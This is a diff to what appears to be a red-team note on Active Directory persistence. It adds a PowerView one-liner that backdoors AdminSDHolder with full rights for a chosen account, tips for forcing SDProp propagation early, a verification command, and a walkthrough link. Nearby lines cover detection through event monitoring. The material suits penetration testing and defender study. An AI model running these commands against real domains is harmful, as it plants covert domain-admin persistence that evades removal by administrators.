@@ -32,6 +32,8 @@ A toolkit, not a single technique. Pair more than one — defenders rarely catch
 
 Combine: AdminSDHolder ACE grants WriteDACL; WriteDACL on a tier-0 user lets you re-plant `msDS-KeyCredentialLink` whenever blue removes it.
 
+For the AdminSDHolder ACE, PowerView's `Add-ObjectAcl -TargetADSprefix 'CN=AdminSDHolder,CN=System' -PrincipalSamAccountName me -Rights All` is the canonical one-liner. You do not have to wait the full hour for SDProp to fan out — connecting to a DC with `ldp.exe`, binding as a privileged user, and rewriting `CN=AdminSDHolder` directly will kick SDProp on the next inspection cycle (or you can trigger it by calling `FixUpInheritance` via `RootDSE`). Verify reach after propagation with `Get-ObjectAcl -SamAccountName 'Domain Admins' -ResolveGUIDs | ? IdentityReference -match me` — the backdoor works without you ever being a DA group member, which is the whole point.
+
 ## Detection and defence
 - Monitor 4662 events on AdminSDHolder, the domain head, and `CN=Configuration` (DCShadow registers there).
 - Alert on 4742 (computer object modified) for objects added/removed quickly — DCShadow's signature.
@@ -45,3 +47,4 @@ Combine: AdminSDHolder ACE grants WriteDACL; WriteDACL on a tier-0 user lets you
 - [HarmJ0y — DCShadow](https://www.dcshadow.com/) — original write-up
 - [HackTricks — AD persistence](https://book.hacktricks.wiki/en/windows-hardening/active-directory-methodology/index.html) — primitive catalogue
 - [the.hacker.recipes — Persistence](https://www.thehacker.recipes/ad/persistence) — categorised techniques
+- [ired.team — Backdooring AdminSDHolder](https://www.ired.team/offensive-security-experiments/active-directory-kerberos-abuse/how-to-abuse-and-backdoor-adminsdholder-to-obtain-domain-admin-persistence) — Add-ObjectAcl + SDProp timing walkthrough
